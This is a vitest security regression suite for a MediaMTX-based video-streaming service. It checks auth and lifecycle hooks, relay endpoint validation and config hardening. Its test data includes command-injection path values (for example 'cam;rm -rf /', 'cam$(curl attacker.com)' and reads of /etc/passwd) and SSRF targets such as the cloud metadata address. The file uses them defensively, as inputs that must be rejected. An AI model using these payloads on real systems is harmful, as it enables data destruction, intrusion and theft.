import { describe, expect, it, vi } from 'vitest'
import {
  createAuthHook,
  type TokenValidator,
  type StreamAccessEvaluator,
} from '../src/hooks/auth.js'
import { createLifecycleHooks } from '../src/hooks/lifecycle.js'
import type { StreamRouteManager } from '../src/routes/stream-route-manager.js'
import {
  generateMediaMtxConfig,
  serializeMediaMtxConfig,
} from '../src/mediamtx/config-generator.js'
import { VideoConfigSchema } from '../src/config.js'
import { validateRelayEndpoint } from '../src/routes/relay-manager.js'

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

function makeValidator(overrides?: Partial<TokenValidator>): TokenValidator {
  return {
    validate: vi.fn().mockResolvedValue({
      valid: true,
      payload: { sub: 'user-1', principal: 'CATALYST::USER', entity: { id: 'u1', name: 'alice' } },
    }),
    ...overrides,
  }
}

function makeEvaluator(decision: 'allow' | 'deny' = 'allow'): StreamAccessEvaluator {
  return { evaluate: vi.fn().mockReturnValue(decision) }
}

function makeAuthHook(opts?: { validator?: TokenValidator; evaluator?: StreamAccessEvaluator }) {
  const validator = opts?.validator ?? makeValidator()
  const evaluator = opts?.evaluator ?? makeEvaluator()
  const app = createAuthHook({
    tokenValidator: validator,
    streamAccess: evaluator,
    nodeId: 'test-node',
    domainId: 'test-domain',
  })
  return { app, validator, evaluator }
}

function makeRouteManager(): StreamRouteManager {
  return {
    handleReady: vi.fn().mockResolvedValue(undefined),
    handleNotReady: vi.fn().mockResolvedValue(undefined),
    streamCount: 0,
    shutdown: vi.fn(),
  } as unknown as StreamRouteManager
}

function makeLifecycleHook(routeManager?: StreamRouteManager) {
  const manager = routeManager ?? makeRouteManager()
  const app = createLifecycleHooks({ routeManager: manager })
  return { app, manager }
}

function authRequest(overrides: Record<string, unknown> = {}) {
  return {
    ip: '192.168.1.100',
    action: 'read',
    path: 'cam-front',
    protocol: 'rtsp',
    id: 'conn-123',
    token: 'eyJhbGciOiJSUzI1NiIs.valid-jwt',
    ...overrides,
  }
}

function hookPayload(overrides: Record<string, unknown> = {}) {
  return {
    path: 'cam-front',
    sourceType: 'rtspSession',
    sourceId: 'conn-12345',
    ...overrides,
  }
}

function makeConfig(overrides: Record<string, unknown> = {}) {
  return VideoConfigSchema.parse({
    orchestratorEndpoint: 'ws://localhost:3000',
    authEndpoint: 'http://localhost:3001',
    systemToken: 'test-token',
    ...overrides,
  })
}

// ---------------------------------------------------------------------------
// SEC-F01: OS Command Injection via Shell Hooks
// ---------------------------------------------------------------------------

describe('SEC-F01: Command injection prevention', () => {
  const shellVectors = [
    { name: 'semicolon', path: 'cam;rm -rf /' },
    { name: 'pipe', path: 'cam|cat /etc/passwd' },
    { name: 'backtick', path: '`whoami`' },
    { name: 'dollar expansion', path: 'cam$(curl attacker.com)' },
    { name: 'ampersand', path: 'cam&& curl evil.com' },
    { name: 'newline', path: 'cam\nwhoami' },
    { name: 'carriage return', path: 'cam\rwhoami' },
    { name: 'path traversal', path: '../../../etc/passwd' },
    { name: 'path with slash', path: 'cam/../secret' },
  ]

  describe('auth hook rejects all injection vectors', () => {
    for (const { name, path } of shellVectors) {
      it(`rejects ${name}: "${path}"`, async () => {
        const { app } = makeAuthHook()
        const res = await app.request('/video-stream/auth', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(authRequest({ path })),
        })
        expect(res.status).toBe(400)
      })
    }
  })

  describe('lifecycle ready hook rejects all injection vectors', () => {
    for (const { name, path } of shellVectors) {
      it(`rejects ${name}: "${path}"`, async () => {
        const { app } = makeLifecycleHook()
        const res = await app.request('/video-stream/hooks/ready', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(hookPayload({ path })),
        })
        expect(res.status).toBe(400)
      })
    }
  })

  describe('valid paths are accepted', () => {
    const validPaths = ['cam-front', 'cam_rear.1', 'lobby-cam-01', 'node1.cam.hallway', 'A123']

    for (const path of validPaths) {
      it(`accepts valid path: "${path}"`, async () => {
        const { app } = makeLifecycleHook()
        const res = await app.request('/video-stream/hooks/ready', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(hookPayload({ path })),
        })
        expect(res.status).toBe(200)
      })
    }
  })
})

// ---------------------------------------------------------------------------
// SEC-F02: Unauthenticated RTSP relay
// ---------------------------------------------------------------------------

describe('SEC-F02: Unauthenticated read prevention', () => {
  it('denies read with empty token from remote IP', async () => {
    const { app } = makeAuthHook()
    const res = await app.request('/video-stream/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(authRequest({ token: '', password: undefined })),
    })
    expect(res.status).toBe(401)
  })

  it('denies read with null token field', async () => {
    const { app } = makeAuthHook()
    const res = await app.request('/video-stream/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(authRequest({ token: undefined })),
    })
    expect(res.status).toBe(401)
  })

  it('relay path addPath includes sourceUser and sourcePass', async () => {
    // This is verified in relay-manager.test.ts — cross-reference check
    const { app } = makeAuthHook()
    const res = await app.request('/video-stream/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(
        authRequest({ token: undefined, password: 'relay-jwt-token', action: 'read' })
      ),
    })
    // Relay auth uses password field — should be accepted if validator approves
    expect(res.status).toBe(200)
  })
})

// ---------------------------------------------------------------------------
// SEC-F03: SSRF via endpoint field
// ---------------------------------------------------------------------------

describe('SEC-F03: SSRF validation', () => {
  const knownHosts = new Set(['10.0.1.5', '10.0.1.6'])

  const blockedEndpoints = [
    { name: 'http scheme', url: 'http://169.254.169.254/latest/meta-data/' },
    { name: 'https scheme', url: 'https://internal-api.local:8080/admin' },
    { name: 'file scheme', url: 'file:///etc/passwd' },
    { name: 'ftp scheme', url: 'ftp://internal-ftp:21/data' },
    { name: 'gopher scheme', url: 'gopher://internal:70/' },
    { name: 'metadata IP', url: 'rtsp://169.254.169.254:8554/cam' },
    { name: 'link-local IPv6', url: 'rtsp://[fe80::1]:8554/cam' },
    { name: 'IPv6 ULA', url: 'rtsp://[fd00::1]:8554/cam' },
    { name: 'loopback IPv4', url: 'rtsp://127.0.0.1:8554/cam' },
    { name: 'loopback IPv6', url: 'rtsp://[::1]:8554/cam' },
    { name: 'wildcard 0.0.0.0', url: 'rtsp://0.0.0.0:8554/cam' },
    { name: 'unknown host', url: 'rtsp://evil.com:8554/cam' },
    { name: 'unknown private IP', url: 'rtsp://10.99.99.99:8554/cam' },
  ]

  for (const { name, url } of blockedEndpoints) {
    it(`rejects ${name}: ${url}`, () => {
      const result = validateRelayEndpoint(url, knownHosts)
      expect(result.safe).toBe(false)
    })
  }

  it('accepts valid rtsp endpoint from known host', () => {
    const result = validateRelayEndpoint('rtsp://10.0.1.5:8554/cam-front', knownHosts)
    expect(result.safe).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// SEC-F07: Config hardening regression tests
// ---------------------------------------------------------------------------

describe('SEC-F07/F11/F16/F22/F23: Config security hardening', () => {
  const mtx = generateMediaMtxConfig(makeConfig(), 3002)

  it('API binds to localhost only', () => {
    expect(mtx.apiAddress).toMatch(/^127\.0\.0\.1:/)
  })

  it('pprof is disabled', () => {
    expect(mtx.pprof).toBe(false)
  })

  it('recording is disabled', () => {
    expect(mtx.record).toBe(false)
  })

  it('SRT is disabled', () => {
    expect(mtx.srt).toBe(false)
  })

  it('WebRTC is disabled', () => {
    expect(mtx.webrtc).toBe(false)
  })

  it('overridePublisher is enabled for camera reconnection', () => {
    expect(mtx.pathDefaults.overridePublisher).toBe(true)
  })

  it('authHTTPExclude only contains api and metrics', () => {
    expect(mtx.authHTTPExclude).toEqual([{ action: 'api' }, { action: 'metrics' }])
  })

  it('no secrets in generated YAML config', () => {
    const yaml = serializeMediaMtxConfig(mtx)
    expect(yaml).not.toContain('test-token')
    expect(yaml).not.toMatch(/eyJ[a-zA-Z0-9_-]+\.eyJ/)
  })
})

// ---------------------------------------------------------------------------
// SEC-F10: Webhook source verification
// ---------------------------------------------------------------------------

describe('SEC-F10: Webhook localhost enforcement', () => {
  it('ready hook rejects remote IP via x-forwarded-for', async () => {
    const { app, manager } = makeLifecycleHook()
    const res = await app.request('/video-stream/hooks/ready', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '10.0.1.99' },
      body: JSON.stringify(hookPayload()),
    })
    expect(res.status).toBe(403)
    expect(manager.handleReady).not.toHaveBeenCalled()
  })

  it('not-ready hook rejects remote IP via x-forwarded-for', async () => {
    const { app, manager } = makeLifecycleHook()
    const res = await app.request('/video-stream/hooks/not-ready', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '10.0.1.99' },
      body: JSON.stringify(hookPayload()),
    })
    expect(res.status).toBe(403)
    expect(manager.handleNotReady).not.toHaveBeenCalled()
  })

  it('ready hook accepts localhost requests', async () => {
    const { app } = makeLifecycleHook()
    const res = await app.request('/video-stream/hooks/ready', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(hookPayload()),
    })
    expect(res.status).toBe(200)
  })
})

// ---------------------------------------------------------------------------
// SEC-F12: No fail-open for reads
// ---------------------------------------------------------------------------

describe('SEC-F12: Subscribe always fails closed', () => {
  it('VideoConfigSchema does not include authFailSubscribe', () => {
    const config = makeConfig()
    expect('authFailSubscribe' in config).toBe(false)
  })

  it('read fails closed when auth service is unreachable', async () => {
    const validator = makeValidator({
      validate: vi.fn().mockRejectedValue(new Error('ECONNREFUSED')),
    })
    const { app } = makeAuthHook({ validator })
    const res = await app.request('/video-stream/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(authRequest()),
    })
    expect(res.status).toBe(503)
  })

  it('authFailPublish defaults to closed', () => {
    const config = makeConfig()
    expect(config.authFailPublish).toBe('closed')
  })
})

// ---------------------------------------------------------------------------
// SEC-F13: DoS via stream flooding
// ---------------------------------------------------------------------------

describe('SEC-F13: Max stream limit enforcement', () => {
  it('maxStreams config defaults to 100', () => {
    const config = makeConfig()
    expect(config.maxStreams).toBe(100)
  })

  it('maxStreams rejects below 1', () => {
    expect(() => makeConfig({ maxStreams: 0 })).toThrow()
  })
})

// ---------------------------------------------------------------------------
// SEC-CROSS-09/10: Fail-closed verification
// ---------------------------------------------------------------------------

describe('SEC-CROSS: Every auth path fails closed', () => {
  it('auth service unreachable → 503 for read', async () => {
    const validator = makeValidator({
      validate: vi.fn().mockRejectedValue(new Error('timeout')),
    })
    const { app } = makeAuthHook({ validator })
    const res = await app.request('/video-stream/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(authRequest({ action: 'read' })),
    })
    expect(res.status).toBe(503)
    const body = await res.json()
    expect(body.error).toBe('system_error')
  })

  it('auth service unreachable → 503 for playback', async () => {
    const validator = makeValidator({
      validate: vi.fn().mockRejectedValue(new Error('timeout')),
    })
    const { app } = makeAuthHook({ validator })
    const res = await app.request('/video-stream/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(authRequest({ action: 'playback' })),
    })
    expect(res.status).toBe(503)
  })

  it('localhost publish succeeds regardless of auth service state', async () => {
    const validator = makeValidator({
      validate: vi.fn().mockRejectedValue(new Error('down')),
    })
    const { app } = makeAuthHook({ validator })
    const res = await app.request('/video-stream/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(authRequest({ action: 'publish', ip: '127.0.0.1' })),
    })
    expect(res.status).toBe(200)
  })

  it('malformed auth payload returns 400, never 200', async () => {
    const { app } = makeAuthHook()
    const res = await app.request('/video-stream/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: 'not json',
    })
    expect(res.status).toBe(400)
  })

  it('Cedar deny returns 403 with error field', async () => {
    const evaluator = makeEvaluator('deny')
    const { app } = makeAuthHook({ evaluator })
    const res = await app.request('/video-stream/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(authRequest()),
    })
    expect(res.status).toBe(403)
    const body = await res.json()
    expect(body.error).toBe('permission_denied')
  })

  it('invalid JWT returns 401 with error field', async () => {
    const validator = makeValidator({
      validate: vi.fn().mockResolvedValue({ valid: false, error: 'JWT signature invalid' }),
    })
    const { app } = makeAuthHook({ validator })
    const res = await app.request('/video-stream/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(authRequest()),
    })
    expect(res.status).toBe(401)
    const body = await res.json()
    expect(body.error).toBe('unauthorized')
  })

  it('no token returns 401 with error field', async () => {
    const { app } = makeAuthHook()
    const res = await app.request('/video-stream/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(authRequest({ token: undefined, password: undefined })),
    })
    expect(res.status).toBe(401)
    const body = await res.json()
    expect(body.error).toBe('unauthorized')
  })
})

// ---------------------------------------------------------------------------
// SEC-F19: Auth hook uses ip field, not headers
// ---------------------------------------------------------------------------

describe('SEC-F19: Auth hook uses MediaMTX ip field, not proxy headers', () => {
  it('publish decision based on ip field, not x-forwarded-for', async () => {
    const { app } = makeAuthHook()
    // ip field says localhost, but x-forwarded-for says remote
    const res = await app.request('/video-stream/auth', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Forwarded-For': '10.0.1.99',
      },
      body: JSON.stringify(authRequest({ action: 'publish', ip: '127.0.0.1' })),
    })
    // Should allow because it uses ip field (127.0.0.1), not header
    expect(res.status).toBe(200)
  })
})
